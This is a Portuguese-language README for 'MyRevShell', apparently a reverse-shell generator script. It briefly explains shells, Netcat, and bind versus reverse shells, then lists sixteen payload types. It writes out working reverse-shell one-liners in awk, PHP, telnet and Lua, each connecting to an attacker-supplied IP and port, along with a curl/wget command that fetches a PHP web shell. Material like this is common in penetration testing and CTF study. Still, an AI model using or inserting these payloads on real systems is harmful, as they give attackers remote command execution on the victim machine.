# O que é uma Shell?
> - Shell é um programa com a função de fornecer uma interface para que os usuários de um sistema operacional tenham acesso aos serviços do kernel.
> - Em geral, os shells do sistema operacional usam uma interface de linha de comando (CLI) ou uma interface gráfica do usuário (GUI).
> - É chamado de shell porque é a camada mais externa ao redor do sistema operacional.
> #### More information: [Wikipedia-Shell](https://en.wikipedia.org/wiki/Shell_%28computing%29)
---

# O que é o Netcat?
> - Considerado o canivete suíço TCP/IP, o Netcat é uma ferramenta de rede usada para ler e escrever dados na rede usando os protocolos TCP ou UDP.
> ### Tipos:
> - [Ncat](https://nmap.org/ncat/)
> - [The GNU Netcat](https://netcat.sourceforge.net/)
> - [Netcat Tradicional](https://packages.debian.org/sid/netcat-traditional)
> - [Netcat OpenBSD](https://packages.debian.org/sid/netcat-openbsd)
> - [Netcat6](http://www.deepspace6.net/projects/netcat6.html)
> - [Socat](http://www.dest-unreach.org/socat/)
> #### More information: [Wikipedia-Netcat](https://en.wikipedia.org/wiki/Netcat)
---

# Reverse Shell e Bind Shell
> ### Bind Shell: 
> - Têm o ouvinte em execução no destino e o invasor se conecta ao ouvinte para obter um shell remoto. 
> - O invasor deve saber o endereço IP da vítima antes de iniciar o Bind Shell. 
> - Às vezes, o Bind Shell falha, porque os firewalls modernos não permitem que pessoas de fora se conectem a portas abertas. 
> ### Reverse Shell:
> - Têm o ouvinte em execução no invasor e o alvo se conecta ao invasor com um shell. 
> - O invasor não precisa saber o endereço IP da vítima, porque o invasor se conectará à nossa porta aberta. 
> - O Shell Reverso pode contornar os problemas do firewall porque a máquina de destino tenta se conectar ao invasor, de modo que o firewall não se incomoda em verificar os pacotes. 
---

# MyRevShell
> O script possui 16 opções de gerador de shell + 1 opção de base64 encode
> ### Tipos:
> - "sh"
> - "zsh"
> - "bash"
> - "nc -c"
> - "nc -e"
> - "nc.exe -e"
> - "nc mkfifo"
> - "ncat -e"
> - "ncat.exe -e"
> - "python x1"
> - "python x2"
> - "python3 x1"
> - "python3 x2"
> - "python3 shortest"
> - "socat x1"
> - "socat x2"
> #### Extra:
> - Awk Shell:
> ``` 
> awk 'BEGIN {s = "/inet/tcp/0/#ip/#port"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } > } while(c != "exit") close(s); }}' /dev/null
> ```
> - PHP exec: 
> ```
> php -r '$sock=fsockopen("#ip",#port);exec("bash <&3 >&3 2>&3");'
> ```
> - Telnet:
> ```
> TF=$(mktemp -u);mkfifo $TF && telnet #ip #port 0<$TF | bash 1>$TF
> ```
> - Lua:
> ```
> lua -e "require('socket');require('os');t=socket.tcp();t:connect('#ip','#port');os.execute('bash -i <&3 >&3 2>&3');"
> ```
> ### Web Shell: 
> Download: 
> - **Curl/Wget: `curl/wget https://raw.githubusercontent.com/h0ru/My-Shell/main/shell.php -O shell.php`**
---
